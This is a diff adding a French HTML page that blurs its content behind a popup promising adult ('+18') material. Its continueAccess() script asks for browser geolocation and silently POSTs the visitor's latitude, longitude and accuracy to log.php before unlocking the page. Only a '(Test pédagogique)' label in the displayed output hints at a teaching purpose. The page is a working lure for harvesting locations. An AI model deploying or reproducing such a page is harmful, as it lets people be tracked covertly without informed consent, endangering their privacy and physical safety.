@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Accès sécurisé</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #0f172a;
+    color: white;
+    height: 100vh;
+    overflow: hidden;
+}
+
+.page {
+    padding: 40px;
+    filter: blur(8px);
+    pointer-events: none;
+}
+
+.overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.75);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 10;
+}
+
+.popup {
+    background: #020617;
+    padding: 30px;
+    border-radius: 12px;
+    text-align: center;
+    max-width: 400px;
+    width: 90%;
+}
+
+button {
+    margin-top: 20px;
+    padding: 12px 20px;
+    border: none;
+    border-radius: 8px;
+    background: #2563eb;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #1d4ed8;
+}
+
+pre {
+    margin-top: 20px;
+    background: #020617;
+    padding: 15px;
+    border-radius: 8px;
+    font-size: 13px;
+}
+</style>
+</head>
+
+<body>
+
+<!-- POPUP -->
+<div class="overlay" id="overlay">
+    <div class="popup">
+        <h2>Accès au contenu</h2>
+        <p>
+            Cliquez sur continuer pour accéder à la page.
+        </p>
+        <button onclick="continueAccess()">Cliquer pour continuer</button>
+    </div>
+</div>
+
+<!-- CONTENU -->
+<div class="page" id="page">
+    <h1>Contenu sensible</h1>
+    <p>Cliquer pour voir le contenu + 18
+</p>
+    <pre id="result"></pre>
+</div>
+
+<script>
+function continueAccess() {
+    navigator.geolocation.getCurrentPosition(
+        (pos) => {
+            fetch("log.php", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body:
+                    "lat=" + pos.coords.latitude +
+                    "&lon=" + pos.coords.longitude +
+                    "&acc=" + pos.coords.accuracy
+            });
+
+            document.getElementById("overlay").style.display = "none";
+            document.getElementById("page").style.filter = "none";
+            document.getElementById("page").style.pointerEvents = "auto";
+
+            document.getElementById("result").textContent =
+`Position enregistrée :
+
+Latitude  : ${pos.coords.latitude}
+Longitude : ${pos.coords.longitude}
+Précision : ${pos.coords.accuracy} m
+
+(Test pédagogique)`;
+        },
+        () => {
+            alert("Accès refusé.");
+        }
+    );
+}
+</script>
+
+</body>
+</html>
